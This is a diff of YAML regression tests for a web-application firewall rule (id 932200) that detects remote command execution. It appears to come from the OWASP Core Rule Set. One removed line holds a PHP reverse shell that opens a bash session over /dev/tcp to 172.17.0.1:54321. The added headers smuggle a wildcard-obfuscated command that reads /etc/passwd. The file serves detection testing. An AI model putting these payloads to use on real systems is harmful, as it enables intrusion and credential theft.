@@ -265,7 +265,7 @@ tests:
           output:
             log_contains: id "932200"
   - test_title: 932200-17
-    desc: "RCE in request headers referer and user-agent"
+    desc: "False positive detection of RCE in Referer header"
     stages:
       - stage:
           input:
@@ -273,15 +273,16 @@ tests:
             headers:
               Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
               Host: localhost
-              User-Agent: <?php `/bin/bash -c \'sh -i>&/dev/tcp/172.17.0.1/54321 0>&1\'`; ?>
+              User-Agent: "OWASP CRS test agent"
+              Referer: "www.google.com;/bin/ca?+/et*/passwd"
             method: GET
             port: 80
             uri: /
             version: HTTP/1.0
           output:
-            log_contains: id "932200"
+            no_log_contains: id "932200"
   - test_title: 932200-18
-    desc: False positive test against query string and space in a parameter
+    desc: "False positive detection of RCE in User-Agent header"
     stages:
       - stage:
           input:
@@ -289,16 +290,15 @@ tests:
             headers:
               Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
               Host: localhost
-              User-Agent: "OWASP CRS test agent"
-              Referer: "http://www.example.com/page?param=test+test"
+              User-Agent: "www.google.com;/bin/ca?+/et*/passwd"
             method: GET
             port: 80
-            uri: /get
+            uri: /
             version: HTTP/1.0
           output:
             no_log_contains: id "932200"
   - test_title: 932200-19
-    desc: False positive test against query string and space in path
+    desc: False positive test against query string start (matched "sezione.jsp")
     stages:
       - stage:
           input:
@@ -307,10 +307,9 @@ tests:
               Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
               Host: localhost
               User-Agent: "OWASP CRS test agent"
-              Referer: "http://www.example.com/page%20test?param=test"
             method: GET
             port: 80
-            uri: /get
+            uri: /get?foo=https://example.com/sezione.jsp?id=17&lb=chi%20siamo&idx=1234
             version: HTTP/1.0
           output:
             no_log_contains: id "932200"
